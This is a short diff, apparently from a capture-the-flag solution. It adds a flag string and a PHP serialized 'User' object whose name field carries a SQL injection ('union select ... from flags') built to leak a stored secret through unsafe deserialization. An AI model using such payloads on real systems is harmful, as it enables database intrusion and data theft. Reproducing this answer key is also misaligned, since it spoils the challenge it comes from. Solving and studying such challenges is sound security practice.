@@ -1,0 +1,3 @@
+ctf4b{Ser14liz4t10n_15_v1rtually_pl41ntext}
+
+O:4:"User":3:{s:2:"id";s:4:"1300";s:4:"name";s:62:"naiyo' union select 114514,(select body from flags limit 1),'a";s:13:"password_hash";s:1:"a";}
